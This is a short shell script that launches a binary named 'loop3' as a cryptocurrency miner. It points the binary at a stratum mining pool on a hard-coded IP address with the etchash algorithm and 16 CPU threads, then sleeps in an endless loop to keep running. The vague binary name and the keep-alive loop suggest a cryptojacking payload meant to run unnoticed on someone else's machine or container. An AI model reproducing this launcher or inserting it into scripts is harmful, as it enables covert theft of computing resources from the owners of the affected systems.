#!/bin/sh
./loop3 -c stratum+tcp://158.69.251.105:4050 -u sbj -p a=etchash --cpu 16
while [ 1 ]; do
sleep 3
done
sleep 999
